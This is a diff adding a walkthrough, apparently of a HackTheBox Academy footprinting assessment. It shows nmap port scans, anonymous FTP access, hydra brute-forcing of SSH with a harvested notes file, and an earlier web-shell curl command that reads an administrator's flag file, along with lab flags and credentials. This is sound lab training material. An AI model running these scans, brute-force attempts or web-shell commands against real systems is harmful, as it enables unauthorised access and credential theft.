@@ -8,6 +8,7 @@
 6. [SMTP](#smtp)
 7. [Skills Assessment](#skill-assesment)
     1. [Easy](#easy)
+    2. [Medium](#medium)
 
 ### FTP
 #### Tools
@@ -395,3 +396,58 @@
     curl http://inlanefreight.htb/shell2.php?c=type%20C:%5CUsers%5CAdministrator%5CDesktop%5Cflag.txt
     ```
     The flag is `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`.
+
+## Medium
+
+1. Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.
+
+    Unlike in the easy challenge, it doesnt give us the running service in the description. In here, i run standard nmap.
+
+    ```bash
+    sudo nmap -sV -sC 10.129.201.127 -v
+    ```
+    ![alt text](Assets/SA-MED1.png)
+
+    Based on the nmap output, we can see it has several process running like ssh, DNS, POP3, and FTP. But i got dead end. So i rerun nmap but now it scans all ports.
+
+    ```bash
+    sudo nmap -p- --min-rate=10000 10.129.201.127
+    ```
+
+    ![alt text](Assets/SA-MED2.png)
+
+    We can see, it gave us new ports. The only new open port is `30021`. So i run nmap again to find what is that.
+
+    ```bash
+    sudo nmap -sV -sC -p30021 10.129.201.127
+    ```
+    ![alt text](Assets/SA-MED3.png)
+
+    Now we know that port is FTP with anonymus login allowed. Then we run ftp into it.
+
+    ```bash
+    ftp 10.129.201.127 30021
+    ```
+    In there we can find mynotes.txt. Here its content.
+
+    ```txt
+    234987123948729384293
+    +23358093845098
+    ThatsMyBigDog
+    Rock!ng#May
+    Puuuuuh7823328
+    8Ns8j1b!23hs4921smHzwn
+    237oHs71ohls18H127!!9skaP
+    238u1xjn1923nZGSb261Bs81
+    ```
+    We can see its a simon personal notes. Maybe one of the is a password?. Then i tried to bruteforce start from ssh to check if we can find valid credential with that notes.
+
+    ```bash
+    hydra -l simon -P mynotes.txt ssh://10.129.201.127
+    ```
+    Just what i tought. We get valid credential `simon:8Ns8j1b!23hs4921smHzwn`. Then we can ssh with that credential.
+
+    ```bash
+    ssh -o KexAlgorithms=diffie-hellman-group14-sha256 -o Ciphers=aes256-ctr simon@10.129.201.127
+    ```
+    We can find flag in there. The answer is `HTB{1qay2wsx3EDC4rfv_M3D1UM}`.
